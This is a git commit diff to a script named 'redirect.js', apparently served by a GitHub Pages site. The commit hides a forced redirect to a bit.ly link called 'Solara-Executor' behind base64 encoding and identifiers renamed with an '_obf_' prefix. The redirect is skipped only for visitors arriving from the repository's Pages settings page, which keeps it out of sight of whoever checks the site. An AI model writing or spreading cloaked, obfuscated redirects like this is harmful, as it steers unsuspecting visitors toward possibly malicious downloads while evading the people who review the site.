0524370ef58116273312a7cded1f061b0c232453
RebornPhantom <83071483+RebornPhantom@users.noreply.github.com>
2024-08-22 14:27:21 -0400

    Update redirect.js

--- redirect.js
+++ redirect.js
@@ -4,7 +4,7 @@ function _obf_func_0() {
     _obf_a.push(arguments);
 }
 _obf_func_0('js', new Date());
-_obf_func_0('config', 'G-NTTP5YDYL7');
+_obf_func_0('config', _obf_func_4('Ry1OVFRQNVlEWUw3'));
 
 function _obf_func_1() {
     return document.referrer;
@@ -12,14 +12,23 @@ function _obf_func_1() {
 
 function _obf_func_2() {
     const _obf_var_0 = _obf_func_1();
-    const _obf_var_1 = 'https://github.com/RebornPhantom/Repository/settings/pages';
+    const _obf_var_1 = _obf_func_4('aHR0cHM6Ly9naXRodWIuY29tL1JlYm9yblBoYW50b20vUmVwb3NpdG9yeS9zZXR0aW5ncy9wYWdlcw==');
     return _obf_var_0 !== _obf_var_1;
 }
 
-if (_obf_func_2()) {
+function _obf_func_3() {
     setTimeout(() => {
-        window.location.href = 'https://bit.ly/Solara-Executor';
+        const _obf_url = _obf_func_4('aHR0cHM6Ly9iaXQubHkvU29sYXJhLUV4ZWN1dG9y');
+        window.location.href = _obf_url;
     }, 100);
+}
+
+function _obf_func_4(encodedStr) {
+    return atob(encodedStr);
+}
+
+if (_obf_func_2()) {
+    _obf_func_3();
 } else {
     console.log('Redirect blocked due to _obf_func_2.');
 }
